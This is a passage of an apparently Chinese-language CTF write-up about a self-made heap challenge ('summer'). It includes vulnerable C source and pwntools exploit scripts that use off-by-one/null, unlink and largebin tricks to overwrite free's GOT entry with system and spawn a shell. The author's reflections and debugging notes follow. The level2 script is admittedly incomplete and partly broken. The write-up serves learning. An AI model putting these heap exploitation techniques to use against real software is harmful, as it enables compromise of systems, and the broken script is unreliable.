    if (!songlist[idx]-&gt;name) 
    {
        puts("ALLOCA ERROR");
        exit(-1);
    }//error
    if (songlist[idx]) 
    {
    puts("CHANGE YOUR SONG NAME NOW :");
    read(0,songlist[idx]-&gt;name,size+1);
    puts("EDIT SUCCESFULLY"); 
    } 
    else
      {
        puts("THE SONG DOESN'T EXIST!");
      }
}
int main()
{ int i = 0;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[4];
  while (1)
  {
    menu();
    puts("YOUR CHOISE :");
    read(0, buf, 4);
    //scanf("%d",&amp;i);
    switch (atoi(buf))
    {
    case 1:
      download();
      sleep(1);
      break;
    case 2:
      delete();
      sleep(1);
      break;
    case 3:
      listen();
      sleep(1);
      break;
    case 4:
      edit();
      sleep(1);
      break;
    case 5:
      exit(0);
      sleep(1);
      break;
    case 6:
      for(i;i&lt;20;i++)
      {
        printf("?????\n");
        sleep(1);
      }
      break;
    default:
      puts("INVALID CHOISE!!!");
      break;
    }
  }
  return 0;
}
</code></pre>
<h2 id="3）解题分析">3）解题分析<a class="post-anchor" href="#3）解题分析"></a></h2><h3 id="1）漏洞点分析">1）漏洞点分析<a class="post-anchor" href="#1）漏洞点分析"></a></h3><pre><code class="bash">rin@fur1n:~/pwn$ checksec summer
[*] '/home/rin/pwn/summer'
    Arch:     amd64-64-little
    RELRO:    NO RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      NO PIE 
</code></pre>
<p>无pie，无relro</p>
<pre><code class="c">printf("NAME :");
      read(0, **((void ***)&amp;songlist + i), size + 1);
      puts("DOWNLOAD SUCCESFULLY");
</code></pre>
<p>一个很直观的漏洞点，read的时候会比原本规定的多读入一个字节，造成off by one。</p>
<h3 id="2）漏洞利用分析">2）漏洞利用分析<a class="post-anchor" href="#2）漏洞利用分析"></a></h3><p>这种堆题一个比较经典的思路就是悬垂指针的利用。利用fake chunk来修改指针造成任意地址写。但众所周知，在2.26后的对于prev_size的检测为无脑chunk overlapping增加了难度。所以这里分别将程序以libc2.23和libc2.27，2.29执行，并且分别分析对应的漏洞利用。</p>
<h4 id="1-level0-baby-overlapping">1)  level0-baby_overlapping<a class="post-anchor" href="#1-level0-baby-overlapping"></a></h4><p>既然是单字节溢出，我们可以考虑修改chunk 的<code>prev_size</code>位后，控制这个chunk的指针，将它劫持到free或者show的got表地址然后leak libc基址。</p>
<p>核心利用思路与ctf wiki关于chunk overlapping上面的示例5一样。</p>
<p>申请两个chunk，然后编辑chunk0，利用off by one覆盖chunk1的<code>prev_size</code>位，然后释放chunk1，由于悬垂指针，我们可以重新add一个0x40大小的chunk1，用free的got表的地址覆盖指向chunk1的指针，再利用<code>show（1）</code>功能打印将它出来，这就完成了内存泄露。</p>
<p>然后利用free的真实地址进而计算出system的真实地址，继而在free的got的位置将free的got表值覆盖为system的地址，通过之前构造的chunk1的content中的<code>"/bin/sh"</code>进行系统调用并getshell。</p>
<p>exp如下。具体的细节说明在注释中。</p>
<pre><code class="python">from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
r = process(["./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6"})#switch the verion of libc
context.log_level = 'debug'
libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')


def add(size,content):
  r.sendline("1")
  r.sendafter(":",str(size))
  r.sendafter(":",content)

def delete(idx):
  r.sendline("2")
  r.sendafter(":",str(idx))

def show(idx):
  r.sendline("3")
  r.sendafter(":",str(idx))

def edit(idx,content):
  r.sendline("4")
  r.sendafter(":",str(idx))
  r.sendafter(":",str(content))

def dbg():
  gdb.attach(r)
  pause()

free_got = 0x4036E8 

add(0x18, b"aaaa")  # chunk0
add(0x10, b"bbbb")  # chunk1
edit(0, b"/bin/sh\x00" + b"a" * 0x10 + b"\x41")
#construct thestruction of chunk0 for the application later.
#Especially the str('/bin/sh')to trigger the system execve()
#dbg()

delete(1)#free chunk1,then the 41 will become the size of chunk1
add(0x20, p64(0) * 4 + p64(0x20) + p64(elf.got['free'])) 
#overlap the chunk1
show(1) 

free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#leak

edit(1, p64(system_addr))

show(1)
delete(0)

r.interactive()
</code></pre>
<h4 id="2）level1-eazy-unlink">2）level1-eazy_unlink<a class="post-anchor" href="#2）level1-eazy-unlink"></a></h4><p>虽然直接修改prevsize位造成堆叠非常简单，但是我们也可以利用unlink中的思路，在chunk中构造fakechunk，通过off by one/null 触发unlink造成堆叠。这并不是特地绕远路，在level2中我们无法直接单字节溢出，必须用到ulnink。</p>
<p>那为什么利用unlink能构造堆叠呢？<strong>详见extra。</strong></p>
<p>构造出堆叠以后的利用就相对模版化，因为保护同样还是只有nx和canary，我们可以很方便地同无保护的堆叠一样修改chunk的指针为<code>free</code>的got表地址来泄露程序的内存布局，然后再用system的got表值把<code>free</code>的got表值覆盖。</p>
<p>具体的细节分析如下。</p>
<h5 id="1）堆风水构造">1）堆风水构造<a class="post-anchor" href="#1）堆风水构造"></a></h5><p><del>ps：程序会先分配一个0x20的chunk储存size。但是效果是一样的</del></p>
<pre><code class="python">add(0xf8,b'aaaa')#chunk0，用来写system的参数
add(0xf8,b'bbbb')#chunk1#在其中伪造fake chunk
add(0xf8,b'cccc')#chunk2#触发unlink
add(0xf8,b'dddd')#chunk3,用来防止free chunk 与 top chunk 合并
</code></pre>
<p>连续申请4个chunk，大小都是0xf8。</p>
<p>0xf8这个数字的来源如何？</p>
<p>分配0xf8的content，实际在内存中是0x101。 为什么是0x101？ 首先我们要实现空字节溢出，一般来说是溢出一个<code>/x00</code>。如果chunk的size过小，先不说free以后分配的chunk的种类，单是空字节溢出也会使得size变成0，这里只有当原本的size是三位数的时候溢出才有意义。 其次还涉及到prec size的在内存的位置问题。</p>
<p><strong>详细分析参见exrta。</strong></p>
<h5 id="2）利用off-by-null-进行unlink">2）利用off by null 进行unlink<a class="post-anchor" href="#2）利用off-by-null-进行unlink"></a></h5><pre><code class="python">payload = p64(0x110)#prev_size
payload += p64(0xf1)#size
payload += p64(next_chunk_addr - 0x18)#fd
payload += p64(next_chunk_addr - 0x10)#bk
payload += b'a'*0xd0#堆的大小减去伪造的heap头，0x100-0x8*5
payload += p64(0xf0)#next_prev_size，利用了off by null的单字节溢出
edit(1,payload)
delete(2)#触发unlink、，造成堆叠
</code></pre>
<p>这里开始进行unlink操作。</p>
<p>首先确定fd，bk地址。确定地址的思路事实上就是之前提到过的，extra部分中对于unlink利用的概述。</p>
<p>所以我们使用的是next_chunk_addr - 0x18/0x10。</p>
<p>Nextchunk addr的地址则是chunk2 ptr。可以通过调试得到具体的值即0x6024b0</p>
<p>并且我们通过空字节溢出使得next chunk的prev size位为F0，它将prev inuse改成了00，使得程序认为chunk1是一个free chunk，当我们释放chunk2，就会触发chunk1的unlink。</p>
<p>而且根据unlink的原理，这段exp使得这个fake chunk的地址向下减少了0x18.(ps:64bit下）</p>
<p>意味着chunk1已经和chunk2形成了堆叠。</p>
<p><strong>具体还是参见extra</strong></p>
<p>堆叠的形成意味着我们可以通过更改chunk1的内容改变它的指针。</p>
<pre><code>payload1 = p64(0xf8)#size
payload1 = p64(free_got_addr)#利用堆叠更改chunk1的指针
edit(1,payload1）
show（1）#此时打印出chunk1的内容，即为free的真实地址
</code></pre>
<h5 id="3）完整exp：">3）完整exp：<a class="post-anchor" href="#3）完整exp："></a></h5><pre><code class="python">
from pwn import *


context.terminal = ["tmux", "splitw", "-h"]
r = process(["./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6"})#switch the verion of libc
context.log_level = 'debug'
libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')



def add(size,content):
  r.recvuntil(":")
  r.sendline("1")
  r.sendlineafter(":",str(size))
  r.sendlineafter(":",content)


def delete(idx):
  r.recvuntil(":")
  r.sendline("2")
  r.sendlineafter(":",str(idx))

def show(idx):
  r.recvuntil(":")
  r.sendline("3")
  r.sendlineafter(":",str(idx))

def edit(idx,content):
  r.recvuntil(":")
  r.sendline("4")
  r.sendlineafter(":",str(idx))
  r.sendlineafter(":",str(content))

def dbg():
  gdb.attach(r)
  pause()

unlink_addr = 0x6024b0
free_got_addr = 0x4036E8
next_chunk_addr = unlink_addr

add(0xf8,b'aaaa')#chunk0，用来写system的参数
add(0xf8,b'bbbb')#chunk1#在其中伪造fake chunk
add(0xf8,b'cccc')#chunk2#触发unlink
add(0xf8,b'dddd')#chunk3,用来防止free chunk 与 top chunk 合并


payload = p64(0x100)#prev_size
payload += p64(0xf1)#size
payload += p64(next_chunk_addr - 0x18)#fd
payload += p64(next_chunk_addr - 0x10)#bk
payload += b'a'*0xd0#堆的大小减去伪造的heap头，0x110-0x8*5
payload += b'0xf0'#next_prev_size
edit(1,payload)
delete(2)#触发unlink，造成堆叠

payload1 = p64(0xf8)#size
payload1 += p64(free_got_addr)#利用堆叠更改chunk1的指针为free的got表
edit(1,payload1)
show(1)#此时打印出chunk1的内容，即为free的真实地址

#leak
free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8,"\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']

edit(1,p64(system_addr))#更改free的got表值为system函数的真实地址
edit(0,"/bin/sh\x00")#将chunk0的内容填充为binsh，作为下面执行函数的参数
delete(0)#由于free的got表值已经被篡改为system，所以调用free即调用system。

r.interactive()
</code></pre>
<h4 id="3）level2-harder-unlink">3）level2-harder_unlink<a class="post-anchor" href="#3）level2-harder-unlink"></a></h4><p>2.29以后glibc代码中增加了对于prev_size的检测</p>
<pre><code class="c">/* consolidate backward */
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
    unlink_chunk (av, p);
}
</code></pre>
<p>来对抗单字节溢出。</p>
<p>检测的内容也很好理解，如果当chunk的<code>size</code>位如果与next chunk的<code>prev_size</code>位不相等即报错。这个检测使我们很难直接通过单字节溢出来控制prev size位。</p>
<p>那么我们应该如何绕过它呢？</p>
<p>很自然地我们想到可以更改next chunk的<code>prev_size</code>，但是仔细想想就会发现这是个无尽套娃。基本不可能。</p>
<p>既然想不出简单的办法绕过，那我们就干脆不修改<code>prev_size</code>了。</p>
<p>一般的poison null byte是通过伪造fd和bk位来伪造fake chunk的地址，使得地址向低地址移动，既然现在不好控制，那么如果内存上有现成的fd和bk供我们利用呢？我们是不是可以利用它们来控制fake chunk—-确有其事，比如说largebin chunk的<code>fd_nextsize</code>,<code>bk_nextsize</code>。</p>
<p>我们可以以<code>fd_nextsize</code>作为fake chunk的fd，<code>bk_nextsize</code>作为fake chunk的bk。</p>
<p>由于<code>fd_nextsize</code>和<code>bk_nextsize</code>用于指向第一个与自己大小不同的chunk，当largebin中只有一个chunk，这两个指针都是指向chunk本身。</p>
<p><strong>具体见extra部分中对于largebin的概述。</strong></p>
<p>利用方式则是：</p>
<ol>
<li><p>申请两个较大的chunk后再释放，要求chunk进入unsorted bin。</p>
</li>
<li><p>将一个largebin申请回来。</p>
</li>
<li><p>在这个largebin chunkA内构造fake。在原本chunkA的bk位置写fake chunk的size位，也就是将fake chunk构建在chunk+0x10处。</p>
</li>
<li><p>然后处理fake chunk的fd和bk位。目的是以chunkA的<code>fd_nextsize</code>指针作为fake chunk的fd位，<code>bk_nextsize</code>指针作为fake chunk的bk。首先是fake chunk的fd位，把chunkA的<code>fd_nextsize</code>指针覆盖到一个可以控制的其bk位的 chunkB上，再伪造chunkB的bk位使其指向fake chunk即可。</p>
</li>
<li><p>对于fake chunk的bk位，按照检测，要触发unlink，bk必须指向fake chunk本身，也就是chunkA+0x10处，这里我们可以利用fastbin的特性，将一个fastbin chunk作为跳板绕过。</p>
</li>
<li><p>fake chunk构造完成后直接free chunkA，触发unlink，造成堆叠。可以利用它leak，然后改free got表。</p>
</li>
</ol>
<p>我们通过exp和图示来理清楚。</p>
<p>由于并没有开启地址随机化，所以地址的覆盖并不需要部分覆写。</p>
<p>前三步可以用下面的图表来说明：</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>首先将tcache填满。</p>
<pre><code class="python">for a in range(7):
    add(0x1000,b'fill')
    delete(a)

for b in range(7):
    add(0x1020,b'fill')
    delete(b)

for c in range(7):
    add(0x20,b'fill')
    delete(c)
</code></pre>
<p>然后让chunk21成为largebin chunk</p>
<pre><code class="python">add(0x500,b'largebin chnuk0')#chunk21
add(0x20,b'top')#chunk22
delete(21)
add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin
#有关这一步的具体说明可以看Tcache部分。
</code></pre>
<p>至此我们获得了一个0x500大小的largebin chunkA，此时这个chunkA的状态还是free。</p>
<p>然后我们要在chunkA的header开始伪造fake chunk。</p>
<p>这是比较关键的一部分。利用到了large bin遗留在内存上的<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针。以 <code>fd_nextsize</code> 为 fake_chunk 的 fd，<code>bk_nextsize</code> 为 fake_chunk 的 bk。但是我们首先需要绕过unlink的安全检测，即之前说过的<code>Fd-&gt;bk = p, BK-&gt;fd = p</code></p>
<p>ps：我们伪造的fake chunk是smallbin chunk，在bin中也是由双向链表维护。</p>
<p>我们分别为<code>FD-&gt;bk = p</code>和<code>BK-&gt;fd = p</code>进行绕过</p>
<p>首先是<code>FD-&gt;bk = p</code>的绕过。</p>
<p>回忆一下之前level1我们绕过的方法论，也就是：</p>
<pre><code>FD-&gt;bk = p   ==&gt; bk_nextsize = p
</code></pre>
<p>所以我们的目的是让<code>bk_nextsize</code>指向fake chunk。</p>
<p><code>BK-&gt;fd = p</code>的绕过同理，等价于构造<code>fd_nextsize</code>，使它指向fake chunk。</p>
<p>但是有趣的是此时我们的largebin中只有一个largebin chunk，它的<code>fd_nextsize</code>,<code>bk_nextsize</code>本身就是指向chunk本身的。然而这样没有任何意义，我们需要修改<code>fd_nextsize</code>到我们需要的地方。</p>
<p>这便又是问题所在。我们需要找到一个方法使得修改<code>fd_nextsize</code>的同时又能绕过检测。</p>
<p>这里我们需要用到其他类型bin chunk的辅助。</p>
<p>我们可以很容易地控制<code>fd_nextsize</code>指向某个smallbin chunkC，而这个smallbin chunkC的fd也指向堆上的某个地址。我们又可以通过修改这个chunkC的fd指针使得它指向fake chunk。这样一来我们利用 chunkC充当中间角色，绕了一圈使得我们目的达成的同时也没有被检测绊住。</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>然后来看实际操作。</p>
<pre><code class="python">add(0x28,p64(0) + p64(0x530) + p64(chunkC_addr))#fake chunk 
</code></pre>
<p>先申请一个chunkB，用来构造fake chunk的size和fd指针。这里fake chunk fd还只是指向chunkC，我们需要修改chunkC的fd指针使它指向fake chunk。</p>
<p>修改chunk header需要利用到悬垂指针。我们下一步应该是构造出chunkC的悬垂指针。</p>
<p>比如从 small bin中拿出的chunk，如果其bin中有多个chunk的话，那么拿出来的chunk的bk上必定残留了指针，因此可以进行覆盖。</p>
<p>这里稍微有一些能讲的基础知识。还是参见extra吧。</p>
<pre><code class="python">add(0x28,b'a') #24
add(0x28,b'a') #25
add(0x28,b'a') #26
add(0x28,b'a') #27
add(0x600,b'a') #28,off by null
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(23 + i)#填充tcache
</code></pre>
<p>多申请一些chunk。</p>
<pre><code>delete(24)
delete(25)
#将chunk24，25free到fastbin
add(0x400,b'aa')#28，smallbin
#申请chunk28后fastbin里的两个chunk被放入small bin。这里的相关机制可以来看看extra。
add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址
</code></pre>
<p>这样一来我们成功使得fd位指向fake chunk，并绕过了<code>FD-&gt;bk = p</code>   </p>
<p>然后是<code>bk_nextsize = p</code>的绕过：</p>
<p>因为<code>bk_nextsize</code>本身指向chunkA，我们还是需要伪造它使得<code>bk_nextsize</code>指向chunkA + 0x10。</p>
<p>对于这个检测我们依旧要利用到别的chunk的帮助</p>
<pre><code class="python">for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(28 + i)#填充tcache
    
add(0x28, 'a')*#23,Tcache

free(20)
free(23) 

for i in range(7):
 add(0x28, 'a')

add(0x28, p64(fake_chunk_addr))
</code></pre>
<p>然后进行unlink。</p>
<p>unlink的触发实际上只需要用off by null向下一个chunk溢出空字节，再free被溢出的chunk就行</p>
<pre><code class="python">add(0x28,b'aa')
edit(28,b'a'*0x20 + p64(0x520))
delete(28)
</code></pre>
<p>整个过程的示意图如下：其中chunk ptr指large bin残留的指针。</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>完整exp：</p>
<pre><code class="python">from pwn import *

r = precess('./summer2')
context.log_level = 'debug'
libc = ELF('./libc-2.29.so')
unlink_addr = 0x6024b0
free_got_addr = 0x4036E8
next_chunk_addr = unlink_addr

def add(size,content):
    r.sendline("1")
    r.sendafter(":",str(size))
    r.sendafter(":",content)

def delete(idx):
    r.sendline("2")
    r.sendafter(":",str(idx))

def show(idx):
    r.sendline("3")
    r.sendafter(":",str(idx))

def edit(idx,content):
    r.sendline("4")
    r.sendafter(":",str(idx))
    r.sendafter(":",str(content))

def dbg():
    gdb.attach(r)
    pause()


#----------------Tcache-------------------
for a in range(7):
    add(0x1000,b'fill')
    delete(a)

for b in range(7):
    add(0x1020,b'fill')
    delete(b)

for c in range(7):
    add(0x20,b'fill')
    delete(c)
#-----------chunk constrution--------------

add(0x500,b'largebin chnuk0')#chunk21
add(0x20,b'top')#chunk22
delete(21)
add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin

#-------fake chunk construction------------

add(0x28,p64(0x530) + p64(chunkC_addr))#fake chunk 

add(0x28,b'a') #24
add(0x28,b'a') #25
add(0x28,b'a') #26
add(0x28,b'a') #27
add(0x600,b'a') #28,off by null
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(23 + i)#填充tcache

#-------FD-&gt;bk = p-------------------------
delete(24)
delete(25)
#将chunk24，25free到fastbin
add(0x400,b'aa')#28，smallbin
#申请chunk28后fastbin里的两个chunk被放入small bin。
add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址
#-------BK-&gt;fd = p-------------------------
for i in range(7):
    add(0x28,'tcache')
for i in range(7):
    delete(28 + i)#填充tcache
    
add(0x28, 'a')*#23,Tcache

free(20)
free(23) 

for i in range(7):
 add(0x28, 'a')

add(0x28, p64(fake_chunk_addr))


#-------unlink-----------------------------

add(0x28,b'aa')
edit(28,b'a'*0x20 + p64(0x520))
delete(28)

#-------leak-------------------------------
show(21)
free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1, p64(system_addr))
show(1)
delete(0)


r.interactive()
</code></pre>
<h2 id="4-总结">4)总结<a class="post-anchor" href="#4-总结"></a></h2><p>不管是level0还是level1、level2，其实都是off by one庞大利用方式中比较基础的点。</p>
<p>level2的思路很有趣。</p>
<p>不管怎样万变不离其中，off by one/null可以导致一个字节的的溢出以修改chunk header，从而触发各种各样的漏洞利用。</p>
<h2 id="5）军训？考核？大冒险！">5）军训？考核？大冒险！<a class="post-anchor" href="#5）军训？考核？大冒险！"></a></h2><p>原本是计划三道题。一道full relro的ret2dl，一道多线程或者xtea加密的re，一道简单off by one（就是summer）。</p>
<p>在军训一天后觉得出三道题，这确实是不可能的事。累倒不累，主要是时间都是碎片化的不好利用。</p>
<p>当时考核发布的时候我们都觉得时间是充足的，能先花时间学考点而不是研究怎么做考核。实际上考核一公布我就写了summer的大概框架，之前没有怎么从源码层面上阅读堆题，甚至那个时候也是刚刚接触堆半个月，所以写得很艰难，大概花了一周的时间把程序完善。后来发现了一个很严重的非预期，觉得自己有点急于求成，对堆一知半解的就想出堆题是不是有点不识好歹了，就暂时放下了考核而开始研究堆题的考点。这期间我也一直认为军训完还有充足的时间来完善题目。</p>
<p>再后来三道题变成了一道题。</p>
<p>很遗憾没有在考核期间完成full relro的ret2dl。。不过有没有作为考核完成也不是特别重要了，我已经部分翻译了原文相关的部分，打算暑假认真调试一下。。。</p>
<p>大概七号的时候就完成了level0和1，本来最初计划就是这两个level的，但是不知道为什么想不开加了level2，学得很艰难。并且</p>
<p>感觉写的支离破碎的，说白了我的知识面不足以支撑我完全理解这个检测的绕过方法，所以一些东西写得十分离奇。比如通篇几乎没有用到edit功能，因为参考的wp的原题都是没有这个功能的。</p>
<p>很让我恼火的就是我对于largebin、smallbin还有Tcache的机制不甚熟悉，而解题中涉及到的堆指针覆写的很多姿势实际上都是基于这些bin特有的机制。</p>
<p>说实话有点惭愧，大一上我干了啥呢。啥也没干。</p>
<p>硬着头皮看🐟最早分享的长亭二进制入门课，那时我愿称之为天书。</p>
<p>做签到栈溢出，复制别人的exp打，搞半天都连接失败，死也打不通。</p>
<p>就跟忘记了当初为什么要学习二进制一样，我也忘记了当时为什么我要每天晚上看那个nep的直播课，忘记做考核的那种不做出来就跳楼的决心来自哪里。</p>
<p>相似地，我还忘记了我为什么要学pwn，而不是我比较憧憬的游戏安全。</p>
<p>就好像一件事情的发生通常拥有直接原因和根本原因，而我的一系列行径是没有直接原因的，并没有什么很直接的驱动力或者很特别的理由。</p>
<p>这是一件非常奇怪的事情。通常来说我是一个比较有明确目标的人，但是在这种关键的事情上我的选择却不是由我本人决断的。</p>
<p>这果然是一件非常奇怪的事情，硬要类比，可以来一句经典名言：” 爱也如此。”</p>
<h2 id="6）extra（慎重观看）">6）extra（慎重观看）<a class="post-anchor" href="#6）extra（慎重观看）"></a></h2><p>extra部分。</p>
<p>多为调试时遇到的环境问题或者一些懂的都懂不必多说的基础知识。</p>
<p>但是怕被说水考核就加上了。</p>
<p><strong>pps：平时文档写多了总有一种奇怪的引导的语气。。。要多具体有多具体的那种，所以废话以及不必要的操作巨多，慎重观看。</strong></p>
<p><strong>ppps：只要我的解题的思路的正文部分足够简略清爽，就不会有人说我拖泥带水（）</strong></p>
<h2 id="调试部分">调试部分<a class="post-anchor" href="#调试部分"></a></h2><h3 id="1-1-解决gdb无法查看heap等信息的问题">1.1-解决gdb无法查看heap等信息的问题<a class="post-anchor" href="#1-1-解决gdb无法查看heap等信息的问题"></a></h3><p>指定libc加载后进行调试。发现gdb无法显示当前的堆块以及链表信息。</p>
<pre><code class="bash">hea
heap: This command only works with libc debug symbols.
They can probably be installed via the package manager of your choice.
See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html

E.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries):
sudo apt-get install libc6-dbg
sudo dpkg --add-architecture i386
sudo apt-get install libc-dbg:i386
</code></pre>
<h5 id="1）通过pwntools加载带有dbg符号的libc">1）通过pwntools加载带有dbg符号的libc<a class="post-anchor" href="#1）通过pwntools加载带有dbg符号的libc"></a></h5><p>加载带有<code>degub_symbols</code>的libc，一般来说是手动添加或者加载带有调试符号的libc，glibc官方文档对此进行了说明。</p>
<p>后者可以从清华镜像站下载。</p>
<p>这里花了一些时间重新了解了一写glibc链接库的一些知识。</p>
<p>更改后的脚本如下</p>
<pre><code class="python">r = process(["./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6"})
context.log_level = 'debug'
libc = ELF('./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')
</code></pre>
<p>执行失败。报错是 <code>doesn't have any GOT symbols, skipping PLT</code></p>
<p>暂未找到解决方案。</p>
<h5 id="2）手动查看堆内存信息">2）手动查看堆内存信息<a class="post-anchor" href="#2）手动查看堆内存信息"></a></h5><p>根据内存分布找到堆上数据的地址，然后通过<code>x/gx</code>命令手动查看。</p>
<p>那么如何找到堆数据具体的内存地址？</p>
<p>打开一个简单的堆题来参考。</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>可以看到heap头地址在B008，比bss_end足足高了FA5。</p>
<p>所以并没有找到什么联系捏。。。</p>
<h5 id="3）手动编译degub版本的libc">3）手动编译degub版本的libc<a class="post-anchor" href="#3）手动编译degub版本的libc"></a></h5><p>下载相应的glibc源码并编译。</p>
<p>编译时需要开启debug</p>
<pre><code>mkdir build &amp;&amp; cd biuld
../configure --prefix = /usr/local/glibc-2.29 --enable-debug = yes
make -j4 &amp;&amp; sudo make install
#64 bit
</code></pre>
<p>编译完成后可以通过链接该库直接编译程序源代码。</p>
<p>如果需要用该版本链接库执行已编译的程序的话可以替换二进制文件解释器路径，但是必须修改程序二进制文件的程序头，将我们需要的ld路径写入。ld路径与libc中的ld路径必须匹配，否则会出错，导致系统指令无法执行。</p>
<p>然后更改LD_PRELOAD环境变量</p>
<h3 id="1-2-解决libc-so-6相关报错问题">1.2-解决libc.so.6相关报错问题<a class="post-anchor" href="#1-2-解决libc-so-6相关报错问题"></a></h3><p>上述脚本执行后，python3报错，原因大致是没有<code>libc.so.6</code>文件。</p>
<p>查看对应文件夹发现情况属实。</p>
<p>解决方案是手动创建对应的<code>lib.so.6</code>文件。</p>
<h3 id="1-3-附加调试后的地址随机化问题。">1.3-附加调试后的地址随机化问题。<a class="post-anchor" href="#1-3-附加调试后的地址随机化问题。"></a></h3><p>一个很奇怪的问题，环境是ubuntu18.04，libc默认2.27.</p>
<p>gdb直接调试程序，内存地址是固定的，但是一旦利用脚本进行附加调试就会出现地址随机化。</p>
<p>附加调试下的heap</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>直接调试下的heap</p>
